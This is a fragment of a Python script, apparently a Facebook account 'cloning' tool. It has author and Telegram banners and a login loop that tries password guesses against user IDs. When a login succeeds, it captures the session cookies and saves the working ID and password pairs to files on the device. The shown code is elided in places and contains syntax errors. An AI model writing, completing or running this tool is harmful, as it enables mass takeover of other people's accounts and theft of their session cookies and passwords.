...
import zlib
import base64
os.system('espeak -a 300 "WELCOME TO OMAR JANN  RANDOM CLONING TOOLS"')
...
\033[1;90m══════════════════════════════════════════════════════════════════════
\033[1;92m[+] AUTHOR    :  Ferdows FaQara
\033[1;92m[+] GITHUB    :  OMARJANN007
\033[1;92m[+] FACEBOOK  :  OMar JaNn
\033[1;92m[+] WHATSAPP  :  +93728718240
\033[1;92m[+] TELEGRAM :  https:/t.me/MuLa_OMar_007
\033[1;92m[+] TOOLS     :  Trial
\033[1;92m[+] VERSION   :  0.02
\033[1;90m══════════════════════════════════════════════════════════════════════""")

clear()
os.system("xdg-open https:/t.me/MuLa_OMar_007")
xxxx = str(len(ugen))
...
def freeq(uid,pwx,tl):
    ...
    'upgrade-insecure-requests': '1',
            ...
            if 'c_user' in log_cookies:
                ...
                uid = coki[151:166]
                print(f'\r\33[1;97m[\033[1;96mOMAR-OK\033[1;97m]\033[1;92m '+uid+' | '+ps+  ' \n [COOKIE🍪] = \33[1;36m'+coki+'\033[0;97m')
                cek_apk(session,coki)
                open('/sdcard/OMAR-OK.txt', 'a').write(uid+' | '+ps+'\n')
                ok.append(uid)
            elif 'checkpoint' in log_cookies:
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    uid=coki[141:156]
                    print(f'\r\33[1;97m[\033[1;90mOMAR-Cp\033[1;97m]\033[1;93m '+uid+' | '+ps+')
                    open('/sdcard/OMARr-Cp.txt', 'a').write(uid+' | '+ps+'\n')
                    cp.append(uid)
                    break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\33[1;35m[OMAR] [%s]  OK: %s CP: %s'%(loop,len(ok),len(cp))), 
        sys.stdout.flush()
    except:
        pass 
#---------------------[END MENU]---------------------#
